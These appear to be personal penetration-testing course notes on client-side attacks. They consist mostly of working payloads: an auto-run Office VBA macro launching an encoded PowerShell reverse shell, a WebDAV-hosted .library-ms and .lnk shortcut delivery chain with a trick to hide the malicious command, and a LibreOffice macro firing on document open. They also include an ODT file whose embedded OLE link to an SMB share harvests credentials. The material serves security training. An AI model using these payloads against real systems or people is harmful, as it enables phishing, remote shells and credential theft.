#windows #macro

### Microsoft Office

🔴 Save the Macro in the same document not for all documents.

#### Split script

```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA5AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA5ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA"

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

#### Macro

```VB
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
	Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
	Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
	Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
	Str = Str + "ALgAxADYAOAAuADQANQAuADIAMQA5AC8AcABvAHcAZQByAGMAY"
	Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
	Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA5ACAALQBwA"
	Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
	Str = Str + "A"
    CreateObject("Wscript.Shell").Run Str
End Sub
```





### Library Files

```bash
pip3 install wsgidav
```

If the installation of WsgiDAV fails with **error: externally-managed-environment**, we can use a _virtual environment_[3](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/client-side-attacks/abusing-windows-library-files/obtaining-code-execution-via-windows-library-files#fn3) or add **--break-system-packages** to the install command. In _PEP 668_,[4](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/client-side-attacks/abusing-windows-library-files/obtaining-code-execution-via-windows-library-files#fn4) a change was introduced to enforce the use of virtual environments and prevent situations in which package installations via pip break the operating system.

```bash
mkdir /home/kali/webdav
```

```bash
touch /home/kali/webdav/test.txt
```

```bash
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

🔴 File Extension -  config.Library-ms
- this will be attached in the email for user to double click, it opens our WebDav directory

```XML
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.236</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

##### Create a Shortcut file with below command
- .lnk file for the user to see when he clicks on the  
- If we expect that our victims are tech-savvy enough to actually check where the shortcut files are pointing, we can use a handy trick. Since our provided command looks very suspicious, we could just put a delimiter and benign command behind it to push the malicious command out of the visible area in the file's property menu. If a user were to check the shortcut, they would only see the benign command.

```powershell
powershell.exe  -WindowStyle hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.164:8000/powercat.ps1'); powercat -c 192.168.45.164 -p 4444 -e powershell"
```
powershell.exe -nop -w hidden IEX(IWR http://192.168.45.209:443/Windows_Tools/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.209 445

### Libre Office

#### Macro Attack

1. Save the document first. 
2. Tools -> Macros -> Edit Macros -> save it in the document

```vb
REM  *****  BASIC  *****

Sub Main
	Shell("cmd /c powershell IEX(IWR http://192.168.225.128/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.225.128 443",0)

End Sub
```

![[Pasted image 20231006120559.png]]
3. Tools->customize->events-> Open Document and add the previous macro then save.

#### Credential Harvesting

1.  Save the Document in the LibreOffice
2. Insert-> OLE Object -> OLE Object
3. Unzip the ODT file and check the content.xml
4. Edit the file path to FIle share path of  KALI. (Ex: file:\//192.168.45.228/hey.txt)

```
<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:rpt="http://openoffice.org/2005/report" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xmlns:chart="urn:oasis:names:tc:opendocument:xmlns:chart:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:ooow="http://openoffice.org/2004/writer" xmlns:oooc="http://openoffice.org/2004/calc" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" xmlns:xforms="http://www.w3.org/2002/xforms" xmlns:tableooo="http://openoffice.org/2009/table" xmlns:calcext="urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0" xmlns:drawooo="http://openoffice.org/2010/draw" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:loext="urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0" xmlns:field="urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0" xmlns:math="http://www.w3.org/1998/Math/MathML" xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:formx="urn:openoffice:names:experimental:ooxml-odf-interop:xmlns:form:1.0" xmlns:dom="http://www.w3.org/2001/xml-events" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:grddl="http://www.w3.org/2003/g/data-view#" xmlns:css3t="http://www.w3.org/TR/css3-text/" xmlns:officeooo="http://openoffice.org/2009/office" office:version="1.3"><office:scripts/><office:font-face-decls><style:font-face style:name="Arial" svg:font-family="Arial" style:font-family-generic="swiss"/><style:font-face style:name="Arial1" svg:font-family="Arial" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="Liberation Sans" svg:font-family="&apos;Liberation Sans&apos;" style:font-family-generic="swiss" style:font-pitch="variable"/><style:font-face style:name="Liberation Serif" svg:font-family="&apos;Liberation Serif&apos;" style:font-family-generic="roman" style:font-pitch="variable"/><style:font-face style:name="Microsoft YaHei" svg:font-family="&apos;Microsoft YaHei&apos;" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="NSimSun" svg:font-family="NSimSun" style:font-family-generic="system" style:font-pitch="variable"/></office:font-face-decls><office:automatic-styles><style:style style:name="P1" style:family="paragraph" style:parent-style-name="Standard"><style:text-properties officeooo:rsid="0014bb86" officeooo:paragraph-rsid="0014bb86"/></style:style><style:style style:name="fr1" style:family="graphic" style:parent-style-name="OLE"><style:graphic-properties style:horizontal-pos="center" style:horizontal-rel="paragraph" draw:ole-draw-aspect="1"/></style:style></office:automatic-styles><office:body><office:text><text:sequence-decls><text:sequence-decl text:display-outline-level="0" text:name="Illustration"/><text:sequence-decl text:display-outline-level="0" text:name="Table"/><text:sequence-decl text:display-outline-level="0" text:name="Text"/><text:sequence-decl text:display-outline-level="0" text:name="Drawing"/><text:sequence-decl text:display-outline-level="0" text:name="Figure"/></text:sequence-decls><text:p text:style-name="P1">CV 2</text:p><text:p text:style-name="P1"><draw:frame draw:style-name="fr1" draw:name="Object1" text:anchor-type="char" svg:width="5.5516in" svg:height="3.9366in" draw:z-index="0"><draw:object xlink:href="file://192.168.45.228/hey.txt" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/><draw:image xlink:href="./ObjectReplacements/Object 1" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p></office:text></office:body></office:document-content>

```
